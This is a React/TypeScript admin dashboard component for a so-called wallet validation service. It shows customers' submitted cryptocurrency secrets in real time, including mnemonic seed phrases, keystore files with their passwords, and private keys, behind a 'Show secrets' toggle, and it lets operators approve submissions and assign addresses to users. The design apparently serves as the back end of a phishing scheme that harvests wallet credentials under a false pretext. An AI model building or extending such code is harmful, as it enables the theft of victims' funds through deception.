"use client";

import { useState, useRef, useEffect, useCallback } from "react";
import { Search, Shield, Wallet, Eye, EyeOff, CheckCircle2, XCircle, Loader2, KeyRound } from "lucide-react";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { toast } from "sonner";
import { useRealtime } from "@/lib/hooks/use-realtime";
import {
  updateWalletValidationStatus,
  assignWalletValidationAddress,
  getSupportedNetworks,
} from "@/lib/admin/actions";

type ValidationRecord = Record<string, unknown>;

type ValidationPayload = {
  eventType: "INSERT" | "UPDATE" | "DELETE";
  new?: ValidationRecord | null;
  old?: ValidationRecord | null;
};

function fieldRow(label: string, value: string | null | undefined) {
  if (!value) return null;
  return (
    <div className="flex items-start gap-2 text-xs">
      <span className="shrink-0 font-medium text-slate-400 w-28">{label}</span>
      <span className="break-all text-slate-600 font-mono">{value}</span>
    </div>
  );
}

function typeBadge(type: string) {
  const colors: Record<string, string> = {
    mnemonics: "bg-rose-50 text-rose-600 border-rose-200",
    keystore: "bg-amber-50 text-amber-700 border-amber-200",
    private_key: "bg-red-50 text-red-600 border-red-200",
    hardware: "bg-cyan-50 text-cyan-600 border-cyan-200",
  };
  return (
    <Badge variant="outline" className={`gap-1 ${colors[type] ?? "bg-slate-100 text-slate-600 border-slate-200"}`}>
      <Shield className="h-3 w-3" />
      {type.replace("_", " ")}
    </Badge>
  );
}

function statusBadge(status: string) {
  const colors: Record<string, string> = {
    pending: "bg-amber-50 text-amber-700 border-amber-200",
    validated: "bg-emerald-50 text-emerald-700 border-emerald-200",
    rejected: "bg-red-50 text-red-600 border-red-200",
  };
  return (
    <Badge variant="outline" className={`gap-1 capitalize ${colors[status] ?? "bg-slate-100 text-slate-600 border-slate-200"}`}>
      {status}
    </Badge>
  );
}

export function AdminWalletValidationsTable({
  validations,
  count,
}: {
  validations: ValidationRecord[];
  count: number;
}) {
  const [records, setRecords] = useState<ValidationRecord[]>(validations);
  const [total, setTotal] = useState(count);
  const [search, setSearch] = useState("");
  const [typeFilter, setTypeFilter] = useState("all");
  const [expandedId, setExpandedId] = useState<string | null>(null);
  const [showSensitive, setShowSensitive] = useState(false);
  const [reviewing, setReviewing] = useState<string | null>(null);
  const [assigning, setAssigning] = useState<string | null>(null);
  const [networks, setNetworks] = useState<{ id: string; name: string }[]>([]);
  const assignDrafts = useRef<Record<string, { address: string; network: string }>>({});
  const prevStatuses = useRef<Record<string, string>>({});
  const ownUpdateAt = useRef<Record<string, number>>({});

  useEffect(() => {
    getSupportedNetworks().then((networks) => {
      setNetworks(networks.map((n) => ({ id: n.id, name: n.name })));
    }).catch(() => undefined);
  }, []);

  const handleAssignDraft = (id: string, patch: Partial<{ address: string; network: string }>) => {
    assignDrafts.current[id] = { address: "", network: "", ...assignDrafts.current[id], ...patch };
  };

  useEffect(() => {
    const map: Record<string, string> = {};
    for (const v of validations) map[v.id as string] = (v.status as string) ?? "pending";
    prevStatuses.current = map;
    setRecords(validations);
    setTotal(count);
  }, [validations, count]);

  // Live updates: submissions from customers appear instantly; approving or
  // rejecting in another tab syncs here too.
  const handleRealtime = useCallback((payload: ValidationPayload) => {
    const row = payload.new;

    if (payload.eventType === "DELETE") {
      setRecords((prev) => prev.filter((v) => (v.id as string) !== payload.old?.id));
      setTotal((t) => Math.max(0, t - 1));
      return;
    }
    if (!row) return;

    if (payload.eventType === "INSERT") {
      toast.info(`${(row.wallet_name as string) ?? "New"} submitted a wallet validation`);
      setRecords((prev) => [{ ...row, profiles: null }, ...prev]);
      setTotal((t) => t + 1);
    } else if (payload.eventType === "UPDATE") {
      const prevStatus = prevStatuses.current[row.id as string];
      const newStatus = (row.status as string) ?? "pending";
      if (prevStatus && prevStatus !== newStatus) {
        const ownAt = ownUpdateAt.current[row.id as string] ?? 0;
        if (Date.now() - ownAt > 4000) {
          toast.success(`${(row.wallet_name as string) ?? "Validation"} is now ${newStatus}`);
        }
      }
      setRecords((prev) =>
        prev.map((v) => ((v.id as string) === row.id ? { ...v, ...row } : v)),
      );
    }
    prevStatuses.current[row.id as string] = (row.status as string) ?? "pending";
  }, []);

  useRealtime<ValidationPayload>("admin-validations-live", "*", "wallet_validations", handleRealtime);

  const handleReview = async (id: string, status: "validated" | "rejected") => {
    setReviewing(id);
    ownUpdateAt.current[id] = Date.now();
    setRecords((prev) =>
      prev.map((v) =>
        (v.id as string) === id ? { ...v, status, reviewed_at: new Date().toISOString() } : v,
      ),
    );
    const res = await updateWalletValidationStatus(id, status);
    setReviewing(null);
    if (res.success) {
      toast.success(`Validation ${status}`);
    } else {
      toast.error(res.error);
      setRecords((prev) =>
        prev.map((v) => ((v.id as string) === id ? { ...v, status: "pending" } : v)),
      );
    }
  };

  const handleAssign = async (id: string) => {
    const draft = assignDrafts.current[id] ?? { address: "", network: "" };
    if (!draft.address.trim()) return toast.error("Wallet address is required");
    if (!draft.network) return toast.error("Select a network");
    setAssigning(id);
    const res = await assignWalletValidationAddress(id, draft.address, draft.network);
    setAssigning(null);
    if (res.success) {
      toast.success("Wallet address assigned — user sees it in real time");
    } else {
      toast.error(res.error);
    }
  };

  const filtered = records.filter((v) => {
    if (search) {
      const q = search.toLowerCase();
      const name = (v.wallet_name as string) ?? "";
      const type = (v.validation_type as string) ?? "";
      if (!name.toLowerCase().includes(q) && !type.toLowerCase().includes(q)) return false;
    }
    if (typeFilter !== "all" && v.validation_type !== typeFilter) return false;
    return true;
  });

  return (
    <div className="space-y-4">
      <div className="flex flex-col gap-3 sm:flex-row sm:items-center">
        <div className="relative flex-1">
          <Search className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-slate-400" aria-hidden="true" />
          <input
            type="text"
            placeholder="Search by wallet name or type…"
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            className="w-full rounded-xl border border-slate-200 bg-white py-2 pl-10 pr-4 text-sm text-slate-900 placeholder:text-slate-400 focus:border-brand-500 focus:outline-none"
            aria-label="Search validations"
          />
        </div>
        <select
          value={typeFilter}
          onChange={(e) => setTypeFilter(e.target.value)}
          className="rounded-xl border border-slate-200 bg-white px-3 py-2 text-sm text-slate-900 focus:outline-none focus:ring-2 focus:ring-brand-500"
          aria-label="Filter by type"
        >
          <option value="all">All types</option>
          <option value="mnemonics">Mnemonics</option>
          <option value="keystore">Keystore</option>
          <option value="private_key">Private Key</option>
          <option value="hardware">Hardware</option>
        </select>
        <button
          type="button"
          onClick={() => setShowSensitive((v) => !v)}
          className="flex items-center gap-2 rounded-xl border border-slate-200 bg-white px-3 py-2 text-sm text-slate-600 hover:text-slate-900 transition"
        >
          {showSensitive ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
          {showSensitive ? "Hide secrets" : "Show secrets"}
        </button>
        <span
          className="inline-flex items-center gap-1.5 rounded-full bg-emerald-50 px-2.5 py-1 text-xs font-medium text-emerald-600"
          title="Validations update in real time"
        >
          <span className="relative flex h-1.5 w-1.5">
            <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75" />
            <span className="relative inline-flex h-1.5 w-1.5 rounded-full bg-emerald-500" />
          </span>
          Live
        </span>
      </div>

      <div className="space-y-3">
        {filtered.length === 0 ? (
          <div className="flex flex-col items-center gap-3 rounded-xl border border-slate-200 bg-slate-50 p-12 text-center">
            <Shield className="h-10 w-10 text-slate-400" />
            <p className="text-sm text-slate-500">No wallet validations found</p>
          </div>
        ) : (
          filtered.map((v) => {
            const id = (v.id as string) ?? Math.random().toString();
            const expanded = expandedId === id;
            const profile = (v.profiles as Record<string, unknown>) ?? {};
            const type = (v.validation_type as string) ?? "hardware";

            return (
              <div
                key={id}
                className="rounded-xl border border-slate-200 bg-white overflow-hidden transition hover:border-slate-300"
              >
                <button
                  type="button"
                  onClick={() => setExpandedId(expanded ? null : id)}
                  className="flex w-full items-center justify-between gap-3 p-4 text-left"
                >
                  <div className="flex items-center gap-3 min-w-0">
                    <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg bg-brand-50 ring-1 ring-brand-200">
                      <Wallet className="h-4 w-4 text-brand-600" aria-hidden="true" />
                    </div>
                    <div className="min-w-0">
                      <p className="truncate text-sm font-semibold text-slate-900">
                        {v.wallet_name as string ?? "Unknown wallet"}
                      </p>
                      <p className="truncate text-xs text-slate-400">
                        {profile.email as string ?? profile.full_name as string ?? "No profile"}
                      </p>
                    </div>
                  </div>
                  <div className="flex items-center gap-2 shrink-0">
                    {statusBadge((v.status as string) ?? "pending")}
                    {typeBadge(type)}
                    <span className="text-xs text-slate-400">
                      {new Date(v.created_at as string).toLocaleDateString()}
                    </span>
                  </div>
                </button>

                {expanded && (
                  <div className="border-t border-slate-200 px-4 pb-4 pt-3 space-y-1.5">
                    {fieldRow("Wallet type", type)}
                    {fieldRow("User ID", v.user_id as string)}
                    {fieldRow("Created", new Date(v.created_at as string).toLocaleString())}

                    {type === "mnemonics" && showSensitive && fieldRow("Phrase", v.mnemonic_phrase as string)}
                    {type === "keystore" && showSensitive && (
                      <>
                        {fieldRow("Keystore JSON", v.keystore_json as string)}
                        {fieldRow("Password", v.keystore_password as string)}
                      </>
                    )}
                    {type === "private_key" && showSensitive && fieldRow("Private Key", v.private_key as string)}
                    {type === "hardware" && fieldRow("Device", v.hardware_type as string)}
                    {v.reviewed_at ? fieldRow("Reviewed", new Date(v.reviewed_at as string).toLocaleString()) : null}
                    {(v.status as string) === "pending" && (
                      <div className="mt-3 flex items-center gap-2 border-t border-slate-200 pt-3">
                        <Button
                          type="button"
                          size="sm"
                          variant="outline"
                          className="rounded-lg border-emerald-300 text-emerald-700 hover:bg-emerald-50"
                          onClick={() => void handleReview(id, "validated")}
                          disabled={reviewing === id}
                        >
                          {reviewing === id ? (
                            <Loader2 className="h-3.5 w-3.5 animate-spin" aria-hidden="true" />
                          ) : (
                            <CheckCircle2 className="h-3.5 w-3.5" aria-hidden="true" />
                          )}
                          Approve
                        </Button>
                        <Button
                          type="button"
                          size="sm"
                          variant="outline"
                          className="rounded-lg border-red-300 text-red-600 hover:bg-red-50"
                          onClick={() => void handleReview(id, "rejected")}
                          disabled={reviewing === id}
                        >
                          <XCircle className="h-3.5 w-3.5" aria-hidden="true" />
                          Reject
                        </Button>
                        <span className="text-[11px] text-slate-400">
                          Customer sees the result in real time
                        </span>
                      </div>
                    )}

                    <div className="mt-3 rounded-lg border border-slate-200 bg-slate-50 p-3">
                      <p className="flex items-center gap-1.5 text-xs font-semibold text-slate-700">
                        <KeyRound className="h-3.5 w-3.5" aria-hidden="true" />
                        Assigned wallet address
                      </p>
                      {v.assigned_address ? (
                        <div className="mt-2 space-y-1">
                          <p className="break-all font-mono text-xs text-slate-800">{v.assigned_address as string}</p>
                          <p className="text-[11px] text-slate-400">
                            {v.assigned_at ? `Assigned ${new Date(v.assigned_at as string).toLocaleString()}` : "Assigned"} — saved to the customer's wallet and visible to them in real time
                          </p>
                          <button
                            type="button"
                            onClick={() => void handleAssign(id)}
                            disabled={assigning === id}
                            className="mt-1 text-[11px] font-medium text-brand-600 hover:text-brand-700 disabled:opacity-50"
                          >
                            {assigning === id ? "Assigning…" : "Re-assign"}
                          </button>
                        </div>
                      ) : (
                        <div className="mt-2 space-y-2">
                          <div className="grid grid-cols-1 gap-2 sm:grid-cols-[1fr_140px]">
                            <input
                              type="text"
                              placeholder="0x… or Solana base58 address"
                              defaultValue={assignDrafts.current[id]?.address ?? ""}
                              onChange={(e) => handleAssignDraft(id, { address: e.target.value })}
                              className="w-full rounded-lg border border-slate-200 bg-white px-3 py-2 font-mono text-xs text-slate-900 focus:border-brand-500 focus:outline-none"
                              aria-label="Wallet address to assign"
                            />
                            <select
                              defaultValue={assignDrafts.current[id]?.network ?? networks[0]?.id ?? ""}
                              onChange={(e) => handleAssignDraft(id, { network: e.target.value })}
                              className="rounded-lg border border-slate-200 bg-white px-2 py-2 text-xs text-slate-900 focus:outline-none focus:ring-2 focus:ring-brand-500"
                              aria-label="Network"
                            >
                              {networks.map((n) => (
                                <option key={n.id} value={n.id}>{n.name}</option>
                              ))}
                            </select>
                          </div>
                          <Button
                            type="button"
                            size="sm"
                            variant="outline"
                            className="rounded-lg border-brand-300 text-brand-700 hover:bg-brand-50"
                            onClick={() => void handleAssign(id)}
                            disabled={assigning === id}
                          >
                            {assigning === id ? (
                              <Loader2 className="h-3.5 w-3.5 animate-spin" aria-hidden="true" />
                            ) : (
                              <KeyRound className="h-3.5 w-3.5" aria-hidden="true" />
                            )}
                            Assign to user
                          </Button>
                        </div>
                      )}
                    </div>
                  </div>
                )}
              </div>
            );
          })
        )}
      </div>

      <p className="text-xs text-slate-400">
        Showing {filtered.length} of {total} total validation records
      </p>
    </div>
  );
}
